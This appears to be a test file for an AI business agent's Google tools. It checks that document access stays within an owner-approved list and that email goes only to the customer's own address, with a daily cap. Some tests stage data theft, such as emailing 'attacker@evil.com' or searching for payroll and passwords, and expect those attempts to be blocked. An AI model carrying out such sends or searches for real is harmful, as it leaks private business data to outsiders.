import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { encrypt, encryptJson } from '../src/lib/crypto.js';
import { availableTools, runTool, type ToolContext } from '../src/agent/tools.js';
import { call, prisma, signup, type Session } from './helpers.js';

const GMAIL = 'https://www.googleapis.com/auth/gmail.send';
const DOCS = 'https://www.googleapis.com/auth/documents.readonly';
const DRIVE = 'https://www.googleapis.com/auth/drive.readonly';
const calls: { url: string; body: string }[] = [];

beforeEach(() => {
  calls.length = 0;
  vi.spyOn(globalThis, 'fetch').mockImplementation(async (input, init) => {
    const url = String(input instanceof Request ? input.url : input);
    calls.push({ url, body: init?.body ? String(init.body) : '' });
    const json = (d: unknown) =>
      new Response(JSON.stringify(d), { status: 200, headers: { 'content-type': 'application/json' } });
    if (url.startsWith('https://oauth2.googleapis.com/token'))
      return json({ access_token: 'at', expires_in: 3600 });
    if (url.includes('gmail.googleapis.com')) return json({ id: 'mail-1' });
    if (url.includes('docs.googleapis.com'))
      return json({
        title: 'Refund policy',
        body: {
          content: [{ paragraph: { elements: [{ textRun: { content: 'Refunds within 7 days.' } }] } }],
        },
      });
    // a Drive search would happily return private files — the agent must never get here
    if (url.includes('drive/v3/files'))
      return json({ files: [{ id: 'secret-payroll', name: 'Payroll 2026', mimeType: 'x' }] });
    return json({ error: `unmocked ${url}` });
  });
});
afterEach(() => vi.restoreAllMocks());

async function connectedTenant(): Promise<{ s: Session; ctx: ToolContext; conversationId: string }> {
  const s = await signup();
  await prisma.googleConnection.create({
    data: {
      userId: s.userId,
      status: 'CONNECTED',
      scopes: [GMAIL, DOCS, DRIVE],
      encryptedCredentials: encryptJson({
        clientId: 'id.apps.googleusercontent.com',
        clientSecret: 'secret',
      }),
      encryptedRefreshToken: encrypt('rt'),
    },
  });
  const channel = await prisma.channel.create({
    data: { userId: s.userId, type: 'TELEGRAM', name: '@b', webhookSecret: 'x' },
  });
  const contact = await prisma.contact.create({
    data: { userId: s.userId, channelType: 'TELEGRAM', externalId: '42', name: 'Ravi' },
  });
  const convo = await prisma.conversation.create({
    data: { userId: s.userId, channelId: channel.id, contactId: contact.id },
  });
  const ctx: ToolContext = {
    userId: s.userId,
    contactId: contact.id,
    conversationId: convo.id,
    businessName: 'Sweet Shop',
    docs: [],
    contactName: 'Ravi',
    contactPhone: null,
    channelLabel: 'Telegram',
    timeZone: 'Asia/Kolkata',
    google: new Set(['gmail', 'googledocs', 'googledrive']),
    googleSettings: {},
    sheets: [],
  };
  return { s, ctx, conversationId: convo.id };
}

const customerSays = (userId: string, conversationId: string, content: string) =>
  prisma.message.create({ data: { userId, conversationId, direction: 'IN', role: 'USER', content } });

describe('C2: documents are limited to the owner’s allow-list', () => {
  it('offers no document tools until the owner approves a document', () => {
    const base = { google: new Set(['googledocs', 'googledrive'] as const), sheets: [] };
    const want = new Set(['search_drive', 'read_doc'] as const);
    expect(availableTools(want as never, { ...base, docs: [] } as never)).toEqual([]);
    expect(
      availableTools(want as never, { ...base, docs: [{ fileId: 'd1', name: 'Menu' }] } as never),
    ).toEqual(['search_drive', 'read_doc']);
  });

  it('read_doc refuses documents that are not on the list', async () => {
    const { ctx } = await connectedTenant();
    ctx.docs = [{ fileId: 'allowed-doc-1234567890', name: 'Refund policy' }];
    expect(await runTool('read_doc', { document_id: 'secret-payroll' }, ctx)).toEqual({
      ok: false,
      error: 'Document not available',
    });
    expect(calls.some((c) => c.url.includes('docs.googleapis.com'))).toBe(false);
    const ok = await runTool('read_doc', { document_id: 'allowed-doc-1234567890' }, ctx);
    expect(ok).toMatchObject({ ok: true, text: 'Refunds within 7 days.' });
  });

  it('search_drive never searches Drive and only returns approved documents', async () => {
    const { ctx } = await connectedTenant();
    ctx.docs = [
      { fileId: 'doc-a', name: 'Refund policy' },
      { fileId: 'doc-b', name: 'Menu' },
    ];
    const res = (await runTool('search_drive', { query: 'payroll salary passwords' }, ctx)) as {
      files: { id: string }[];
    };
    expect(res.files.map((f) => f.id).sort()).toEqual(['doc-a', 'doc-b']);
    expect((await runTool('search_drive', { query: 'refund' }, ctx)) as unknown).toMatchObject({
      files: [{ id: 'doc-a' }],
    });
    expect(calls.some((c) => c.url.includes('drive/v3/files'))).toBe(false);
  });

  it('owners add and remove documents; links are checked with their Google account', async () => {
    const { s } = await connectedTenant();
    expect((await call(s, 'POST', '/api/docs', { doc: 'https://example.com/not-a-doc' })).statusCode).toBe(
      400,
    );
    const add = await call(s, 'POST', '/api/docs', {
      doc: 'https://docs.google.com/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz012345/edit',
    });
    expect(add.statusCode).toBe(201);
    expect(add.json().doc).toMatchObject({
      fileId: '1AbCdEfGhIjKlMnOpQrStUvWxYz012345',
      name: 'Refund policy',
    });
    expect((await call(s, 'GET', '/api/docs')).json().docs).toHaveLength(1);
    expect((await call(s, 'DELETE', `/api/docs/${add.json().doc.id}`)).statusCode).toBe(200);
  });
});

describe('C2: email only goes to the customer, a few times a day', () => {
  it('refuses an address the customer never gave', async () => {
    const { s, ctx, conversationId } = await connectedTenant();
    await customerSays(s.userId, conversationId, 'Please send the brochure to ravi@shop.in');
    const res = await runTool('send_email', { to: 'attacker@evil.com', subject: 'x', body: 'y' }, ctx);
    expect(res).toMatchObject({ ok: false });
    expect(calls.some((c) => c.url.includes('gmail'))).toBe(false);
  });

  it('sends to the customer’s own address with a footer, and stops after 3 a day', async () => {
    const { s, ctx, conversationId } = await connectedTenant();
    await customerSays(s.userId, conversationId, 'my mail is Ravi@Shop.in thanks');
    for (let i = 0; i < 3; i++) {
      const ok = await runTool(
        'send_email',
        { to: 'ravi@shop.in', subject: 'Brochure', body: 'Attached' },
        ctx,
      );
      expect(ok).toMatchObject({ ok: true, sent_to: 'ravi@shop.in' });
    }
    const raw = JSON.parse(calls.find((c) => c.url.includes('gmail'))!.body).raw as string;
    expect(Buffer.from(raw, 'base64url').toString('utf8')).toContain("Sent by Sweet Shop's AI assistant.");
    const fourth = await runTool('send_email', { to: 'ravi@shop.in', subject: 'x', body: 'y' }, ctx);
    expect(fourth).toMatchObject({ ok: false });
    expect(calls.filter((c) => c.url.includes('gmail'))).toHaveLength(3);
  });

  it('also accepts the email saved in the customer’s profile', async () => {
    const { ctx } = await connectedTenant();
    await prisma.contact.update({
      where: { id: ctx.contactId! },
      data: { profile: { email: 'saved@shop.in' } },
    });
    expect(await runTool('send_email', { to: 'saved@shop.in', subject: 's', body: 'b' }, ctx)).toMatchObject({
      ok: true,
    });
  });
});
